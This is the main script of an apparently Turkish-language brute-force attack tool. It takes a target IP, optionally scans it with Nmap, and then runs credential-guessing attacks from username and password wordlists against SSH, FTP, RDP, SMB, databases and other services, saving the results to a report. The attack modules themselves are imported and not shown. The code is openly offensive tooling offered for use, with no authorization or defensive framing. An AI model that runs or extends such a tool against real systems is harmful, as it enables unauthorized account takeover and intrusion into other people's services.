import os
import socket
from services.scanner import NmapTarayici
from services.ftp import FTPBruteForce
from services.ssh import SSHBruteForce
from services.http import HTTPBruteForce
from services.https import HTTPSBruteForce
from services.mysql import MySQLBruteForce
from services.postgres import PostgreSQLBruteForce
from services.smtp import SMTPBruteForce
from services.pop3 import POP3BruteForce
from services.imap import IMAPBruteForce
from services.rdp import RDPBruteForce
from services.smb import SMBBruteForce
from services.telnet import TelnetBruteForce
from services.vnc import VNCBruteForce
from services.mssql import MSSQLBruteForce
from services.mongodb import MongoDBBruteForce
from utils.raporlayici import Raporlayici
from config import Ayarlar

def giris_ekrani():
    print("=" * 60)
    print("GELİŞMİŞ BRUTE-FORCE SALDIRI ARACI".center(60))
    print("=" * 60)
    print(f"Versiyon: 2.0 | Nmap Entegrasyonlu | MongoDB Desteği\n")

def gecerli_ip_girisi(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def hedef_ip_al():
    while True:
        ip = input("Hedef IP adresini girin: ").strip()
        if gecerli_ip_girisi(ip):
            return ip
        print("[!] Geçersiz IP formatı! Örnek: 192.168.1.1")

def servis_secimi():
    print("\nKullanılabilir Servisler:")
    for i, (servis, port) in enumerate(Ayarlar.PORTLAR.items(), 1):
        print(f"{i}. {servis.upper()} (Port {port})")
    
    secim = input("\nTüm servisler için [A], seçim için [S], Nmap taraması için [N] girin: ").upper()
    
    if secim == 'N':
        return 'NMAP'
    elif secim == 'A':
        return None  # Tüm servisler
    elif secim == 'S':
        try:
            num = int(input("Servis numarası girin: "))
            servis = list(Ayarlar.PORTLAR.keys())[num-1]
            return [servis]
        except (ValueError, IndexError):
            print("[!] Geçersiz seçim, tüm servisler kullanılacak")
            return None
    else:
        print("[!] Geçersiz seçim, tüm servisler kullanılacak")
        return None

def nmap_tarama_ve_saldiri(hedef_ip, raporlayici):
    try:
        print("\n[+] Nmap tarama ayarları:")
        print(f" - Port aralığı (varsayılan: {Ayarlar.NMAP_PORT_ARALIGI})")
        print(f" - Tarama parametreleri: {Ayarlar.NMAP_ARGUMANLARI}")
        
        port_araligi = input("Port aralığı girin (örn: 1-1000): ").strip() or Ayarlar.NMAP_PORT_ARALIGI
        tarayici = NmapTarayici(hedef_ip)
        acik_servisler = tarayici.detayli_tarama(port_araligi)
        
        if not acik_servisler:
            print("[-] Açık port bulunamadı")
            return
        
        print("\n[+] Bulunan Servisler:")
        for servis in acik_servisler:
            print(f" - Port {servis['port']}/{servis['protokol']}: {servis['servis']} ({servis['versiyon']})")
        
        servis_esleme = {
            'ftp': FTPBruteForce,
            'ssh': SSHBruteForce,
            'http': HTTPBruteForce,
            'https': HTTPSBruteForce,
            'mysql': MySQLBruteForce,
            'postgresql': PostgreSQLBruteForce,
            'mongodb': MongoDBBruteForce,
            'smtp': SMTPBruteForce,
            'pop3': POP3BruteForce,
            'imap': IMAPBruteForce,
            'rdp': RDPBruteForce,
            'smb': SMBBruteForce,
            'telnet': TelnetBruteForce,
            'vnc': VNCBruteForce,
            'mssql': MSSQLBruteForce
        }
        
        for servis in acik_servisler:
            servis_adi = servis['servis']
            if servis_adi in servis_esleme:
                print(f"\n[+] {servis_adi.upper()} servisi taranıyor ({hedef_ip}:{servis['port']})...")
                try:
                    saldiri = servis_esleme[servis_adi](hedef_ip, servis['port'])
                    sonuc = saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
                    if sonuc:
                        print(f"[+] {servis_adi.upper()} için başarılı giriş bulundu!")
                    else:
                        print(f"[-] {servis_adi.upper()} için başarılı giriş bulunamadı.")
                except Exception as e:
                    print(f"[!] Hata: {str(e)}")
                    continue
    except Exception as e:
        print(f"[!] Nmap tarama hatası: {str(e)}")
        raporlayici.rapor_ekle("NMAP", hedef_ip, "N/A", "HATA", str(e))

def manuel_saldiri(hedef_ip, secilen_servisler, raporlayici):
    servisler = []
    
    for servis_adi, port in Ayarlar.PORTLAR.items():
        if secilen_servisler is None or servis_adi in secilen_servisler:
            try:
                servis_sinifi = globals()[f"{servis_adi.upper()}BruteForce"]
                servisler.append(servis_sinifi(hedef_ip, port))
            except KeyError:
                print(f"[!] {servis_adi} servis modülü bulunamadı")
                continue
    
    for servis in servisler:
        print(f"\n[+] {servis.servis_adi} servisi taranıyor ({hedef_ip}:{servis.hedef_port})...")
        try:
            sonuc = servis.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
            if sonuc:
                print(f"[+] {servis.servis_adi} için başarılı giriş bulundu!")
            else:
                print(f"[-] {servis.servis_adi} için başarılı giriş bulunamadı.")
        except Exception as e:
            print(f"[!] Hata: {str(e)}")
            continue

def main():
    # Dizinleri oluştur
    for dir in ["wordlists", "reports", "sonuclar"]:
        os.makedirs(dir, exist_ok=True)
    
    giris_ekrani()
    hedef_ip = hedef_ip_al()
    secim = servis_secimi()
    
    raporlayici = Raporlayici()
    
    if secim == 'NMAP':
        nmap_tarama_ve_saldiri(hedef_ip, raporlayici)
    else:
        manuel_saldiri(hedef_ip, secim, raporlayici)
    
    # Rapor
    raporlayici.rapor_yazdir()
    raporlayici.raporu_dosyaya_kaydet(Ayarlar.RAPOR_DOSYASI)
    print(f"\n[+] Rapor kaydedildi: {Ayarlar.RAPOR_DOSYASI}")

if __name__ == "__main__":
    main()